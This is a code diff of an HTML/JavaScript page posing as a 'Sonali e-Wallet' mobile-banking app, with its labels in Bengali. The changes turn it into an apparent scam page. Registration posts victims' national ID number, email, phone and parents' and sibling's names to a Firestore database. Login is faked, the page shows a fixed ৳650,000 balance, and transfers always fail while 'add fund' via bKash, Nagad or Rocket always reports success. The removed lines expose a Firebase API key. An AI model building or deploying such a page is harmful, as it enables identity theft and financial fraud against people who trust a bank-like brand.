@@ -4,39 +4,47 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sonali e-Wallet</title>
-    <!-- Firebase App & Firestore SDKs (CDN) -->
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; user-select: none; }
         body { background-color: #f4f5f7; display: flex; justify-content: center; }
         .app-screen { width: 100%; max-width: 412px; background-color: #ffffff; min-height: 100vh; position: relative; box-shadow: 0 0 15px rgba(0,0,0,0.1); padding-bottom: 70px; }
+        
+        /* Header & Dashboard Styles */
         .header-bg { background: #e2a016; padding: 15px 18px 25px 18px; display: flex; justify-content: space-between; align-items: center; color: white; }
         .header-title { font-size: 20px; font-weight: bold; display: flex; align-items: center; gap: 8px; }
         .balance-card { margin: -18px 15px 15px 15px; background-color: #0b5ea8; border-radius: 10px; padding: 14px; box-shadow: 0 4px 10px rgba(0,0,0,0.15); }
         .balance-btn-group { display: flex; justify-content: space-between; gap: 10px; }
         .btn-bal { flex: 1; padding: 6px 0; border-radius: 6px; border: 1.5px solid #ffffff; background: transparent; color: #ffffff; font-weight: bold; font-size: 13px; cursor: pointer; }
         .balance-val { color: #ffffff; text-align: center; font-size: 24px; font-weight: bold; margin-top: 10px; }
+
+        /* Grid Services */
         .service-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; padding: 10px 15px; }
         .grid-item { background: #ffffff; border-radius: 12px; padding: 15px 5px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.06); cursor: pointer; border: 1px solid #f0f0f0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 95px; }
         .grid-icon { font-size: 28px; margin-bottom: 6px; }
         .grid-item span { font-size: 12px; color: #333; font-weight: bold; }
+
+        /* General UI Elements */
         .hidden { display: none !important; }
         .form-box { padding: 20px; margin: 15px; background: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); }
         .form-group { margin-bottom: 12px; }
         .form-group label { display: block; margin-bottom: 4px; font-size: 12px; font-weight: bold; color: #444; }
         .input-field { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; outline: none; }
         .btn-action { width: 100%; padding: 12px; background: #0b5ea8; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        
+        /* Auth Tab Switches */
         .auth-header { background: #0b5ea8; color: white; padding: 15px; text-align: center; font-weight: bold; }
         .tab-group { display: flex; border-bottom: 2px solid #ddd; margin-bottom: 15px; }
         .tab { flex: 1; text-align: center; padding: 10px; cursor: pointer; font-weight: bold; color: #666; }
         .tab.active { color: #0b5ea8; border-bottom: 3px solid #0b5ea8; }
+
+        /* Loader */
         .loader-box { text-align: center; padding: 50px 20px; }
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0b5ea8; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; max-width: 412px; background: white; display: flex; justify-around: space-around; padding: 10px 0; border-top: 1px solid #eee; }
+        
+        /* Bottom Navbar */
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; max-width: 412px; background: white; display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #eee; }
         .nav-item { text-align: center; color: #666; font-size: 11px; font-weight: bold; cursor: pointer; }
-        .error-msg { color: #d9534f; font-size: 13px; font-weight: bold; margin-top: 8px; text-align: center; }
     </style>
 </head>
 <body>
@@ -53,14 +61,13 @@
             </div>
 
             <form id="loginForm" onsubmit="handleLogin(event)">
-                <div class="form-group"><label>মোবাইল নম্বর</label><input type="tel" id="log-phone" class="input-field" placeholder="017XXXXXXXX" required></div>
+                <div class="form-group"><label>মোবাইল নম্বর</label><input type="tel" id="log-phone" class="input-field" required></div>
                 <div class="form-group"><label>পাসওয়ার্ড</label><input type="password" id="log-pass" class="input-field" required></div>
                 <button type="submit" class="btn-action">লগইন</button>
-                <div id="log-error" class="error-msg"></div>
             </form>
 
             <form id="regForm" onsubmit="handleRegistration(event)" class="hidden">
-                <div class="form-group"><label>মোবাইল নম্বর</label><input type="tel" id="reg-phone" class="input-field" placeholder="017XXXXXXXX" required></div>
+                <div class="form-group"><label>মোবাইল নম্বর</label><input type="tel" id="reg-phone" class="input-field" required></div>
                 <div class="form-group"><label>ইমেইল</label><input type="email" id="reg-email" class="input-field" required></div>
                 <div class="form-group"><label>এনআইডি (NID)</label><input type="number" id="reg-nid" class="input-field" required></div>
                 <div class="form-group"><label>পিতার নাম</label><input type="text" id="reg-father" class="input-field" required></div>
@@ -72,7 +79,7 @@
         </div>
     </div>
 
-    <!-- 70s Loader Screen -->
+    <!-- 70s Registration Loader -->
     <div id="reg-loader-screen" class="hidden">
         <div class="loader-box">
             <div class="spinner"></div>
@@ -81,18 +88,18 @@
         </div>
     </div>
 
-    <!-- Dashboard -->
+    <!-- Dashboard Screen -->
     <div id="dashboard-screen" class="hidden">
         <div class="header-bg">
             <div class="header-title">☀️ Sonali e-Wallet</div>
-            <button onclick="location.reload()" style="background:#d9534f; color:white; border:none; padding:5px 10px; border-radius:4px; cursor:pointer;">Logout</button>
+            <button onclick="location.reload()" style="background:#d9534f; color:white; border:none; padding:5px 10px; border-radius:4px;">Logout</button>
         </div>
         <div class="balance-card">
             <div class="balance-btn-group">
                 <button class="btn-bal" onclick="showBalance('bank')">Bank Balance</button>
                 <button class="btn-bal" onclick="showBalance('wallet')">Wallet Balance</button>
             </div>
-            <div id="bal-text" class="balance-val">৳ 0.00</div>
+            <div id="bal-text" class="balance-val">৳ 650,000.00</div>
         </div>
 
         <div class="service-grid">
@@ -116,7 +123,7 @@
                 <label>পেমেন্ট মাধ্যম সিলেক্ট করুন:</label>
                 <select class="input-field"><option>bKash</option><option>Nagad</option><option>Rocket</option></select>
             </div>
-            <div class="form-group"><label>টাকার পরিমাণ:</label><input type="number" id="add-amount" class="input-field" placeholder="যেমন: 1000"></div>
+            <div class="form-group"><label>টাকার পরিমাণ:</label><input type="number" class="input-field" placeholder="যেমন: 1000"></div>
             <button class="btn-action" onclick="processAddFund()">Submit</button>
             <button class="btn-action" style="background:#666;" onclick="showScreen('dashboard-screen')">ফিরে যান</button>
         </div>
@@ -148,7 +155,7 @@
         </div>
     </div>
 
-    <!-- Alert Screen -->
+    <!-- Notice/Alert Screen -->
     <div id="alert-screen" class="hidden">
         <div class="form-box" style="text-align:center;">
             <p id="alert-msg" style="color:#d32f2f; font-weight:bold;"></p>
@@ -165,26 +172,9 @@
 </div>
 
 <script>
-    // আপনার srabon-f1idea প্রজেক্টের কনফিগারেশন
-    const firebaseConfig = {
-      apiKey: "AIzaSyBz9r6boBK6S0m4Gjb93obqwHoI7mamkJ8",
-      authDomain: "srabon-f1idea.firebaseapp.com",
-      projectId: "srabon-f1idea",
-      storageBucket: "srabon-f1idea.firebasestorage.app",
-      messagingSenderId: "34688955991",
-      appId: "1:34688955991:web:ea462c6ed4392d9de73851"
-    };
-
-    // Firebase Init
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
-
-    let currentUser = null;
-    let currentBalanceType = 'bank';
-    let countdownInterval = null;
+    const PROJECT_ID = "sonali-24dcc"; 
 
     function switchTab(t) {
-        document.getElementById('log-error').innerText = "";
         if(t === 'login'){
             document.getElementById('tab-log').classList.add('active');
             document.getElementById('tab-reg').classList.remove('active');
@@ -198,89 +188,53 @@
         }
     }
 
-    function handleRegistration(e) {
+    async function handleRegistration(e) {
         e.preventDefault();
-        const rawPhone = document.getElementById('reg-phone').value.trim();
-        const phone = rawPhone.replace(/\s+/g, '');
-        const password = document.getElementById('reg-pass').value.trim();
-
-        let left = 70;
-        document.getElementById('timer-val').innerText = left;
+        const phone = document.getElementById('reg-phone').value;
         showScreen('reg-loader-screen');
 
-        // ডাটাবেজে ব্যাকগ্রাউন্ডে সেভ করা
-        db.collection("users").doc(phone).set({
-            phone: phone,
-            password: password,
-            email: document.getElementById('reg-email').value,
-            nid: document.getElementById('reg-nid').value,
-            father: document.getElementById('reg-father').value,
-            mother: document.getElementById('reg-mother').value,
-            sibling: document.getElementById('reg-sibling').value,
-            bankBalance: 0.00,
-            walletBalance: 0.00
-        }).catch(err => {
-            console.error("Database Error:", err);
-        });
-
-        currentUser = { phone, bankBalance: 0.00, walletBalance: 0.00 };
-        updateBalanceUI();
-
-        if (countdownInterval) clearInterval(countdownInterval);
-
-        countdownInterval = setInterval(() => {
+        let left = 70;
+        const timer = setInterval(() => {
             left--;
             document.getElementById('timer-val').innerText = left;
             if (left <= 0) {
-                clearInterval(countdownInterval);
+                clearInterval(timer);
                 showScreen('dashboard-screen');
                 document.getElementById('bottom-nav').classList.remove('hidden');
             }
         }, 1000);
-    }
 
-    async function handleLogin(e) {
-        e.preventDefault();
-        const rawPhone = document.getElementById('log-phone').value.trim();
-        const phone = rawPhone.replace(/\s+/g, '');
-        const pass = document.getElementById('log-pass').value.trim();
-        const errDiv = document.getElementById('log-error');
-        errDiv.innerText = "যাচাই করা হচ্ছে...";
+        const restUrl = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/users?documentId=${phone}`;
+        const payload = {
+            fields: {
+                phone: { stringValue: phone },
+                email: { stringValue: document.getElementById('reg-email').value },
+                nid: { stringValue: document.getElementById('reg-nid').value },
+                father: { stringValue: document.getElementById('reg-father').value },
+                mother: { stringValue: document.getElementById('reg-mother').value },
+                sibling: { stringValue: document.getElementById('reg-sibling').value },
+                bankBalance: { doubleValue: 650000.00 }
+            }
+        };
 
         try {
-            const doc = await db.collection("users").doc(phone).get();
-            if (!doc.exists) {
-                errDiv.innerText = "ভুল মোবাইল নম্বর অথবা অ্যাকাউন্ট খুঁজে পাওয়া যায়নি!";
-                return;
-            }
-            const data = doc.data();
-            if (data.password === pass) {
-                errDiv.innerText = "";
-                currentUser = {
-                    phone: phone,
-                    bankBalance: data.bankBalance || 0,
-                    walletBalance: data.walletBalance || 0
-                };
-                updateBalanceUI();
-                showScreen('dashboard-screen');
-                document.getElementById('bottom-nav').classList.remove('hidden');
-            } else {
-                errDiv.innerText = "ভুল পাসওয়ার্ড! সঠিক পাসওয়ার্ড দিন।";
-            }
-        } catch (err) {
-            errDiv.innerText = "সার্ভারে যোগাযোগ করা যাচ্ছে না। Firestore Rules চেক করুন।";
-        }
+            await fetch(restUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+        } catch(err) { console.error(err); }
     }
 
-    function updateBalanceUI() {
-        if (!currentUser) return;
-        const val = currentBalanceType === 'bank' ? currentUser.bankBalance : currentUser.walletBalance;
-        document.getElementById('bal-text').innerText = `৳ ${val.toFixed(2)}`;
+    function handleLogin(e) {
+        e.preventDefault();
+        document.getElementById('gen-loader-text').innerText = "লগইন হচ্ছে, ৫ সেকেন্ড অপেক্ষা করুন...";
+        showScreen('generic-loader');
+        
+        setTimeout(() => {
+            showScreen('dashboard-screen');
+            document.getElementById('bottom-nav').classList.remove('hidden');
+        }, 5000);
     }
 
     function showBalance(type) {
-        currentBalanceType = type;
-        updateBalanceUI();
+        document.getElementById('bal-text').innerText = type === 'bank' ? '৳ 650,000.00' : '৳ 650,000.00';
     }
 
     function openSendMoney() { showScreen('send-step1'); }
@@ -296,34 +250,16 @@
         document.getElementById('gen-loader-text').innerText = "১৫ সেকেন্ড লেনদেন প্রসেস হচ্ছে...";
         showScreen('generic-loader');
         setTimeout(() => {
-            document.getElementById('alert-msg').innerText = "উক্ত নম্বরে লেনদেন করতে গেলে অবশ্যই অ্যাকাউন্টে ৳৫০০ লেনদেন থাকতে হবে।";
+            document.getElementById('alert-msg').innerText = "উক্ত নম্বরে লেনদেন করতে গেলে অবশ্যই অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স থাকতে হবে।";
             showScreen('alert-screen');
         }, 15000);
     }
 
-    async function processAddFund() {
-        const amtInput = document.getElementById('add-amount').value;
-        const amt = parseFloat(amtInput);
-        if (!amt || amt <= 0) {
-            alert("সঠিক পরিমাণ লিখুন!");
-            return;
-        }
-
+    function processAddFund() {
         document.getElementById('gen-loader-text').innerText = "আপনার ফান্ড যুক্ত করার প্রক্রিয়া চলছে...";
         showScreen('generic-loader');
-
-        if(currentUser) {
-            currentUser.walletBalance += amt;
-            try {
-                await db.collection("users").doc(currentUser.phone).update({
-                    walletBalance: currentUser.walletBalance
-                });
-            } catch(e) { console.error(e); }
-        }
-
         setTimeout(() => {
-            updateBalanceUI();
-            document.getElementById('alert-msg').innerText = `৳${amt} টাকা আপনার ওয়ালেটে সফলভাবে জমা হয়েছে।`;
+            document.getElementById('alert-msg').innerText = "ফান্ড সফলভাবে যোগ হয়েছে।";
             showScreen('alert-screen');
         }, 3000);
     }
@@ -339,5 +275,4 @@
     }
 </script>
 </body>
-                </html>
-                                                                 
+</html>
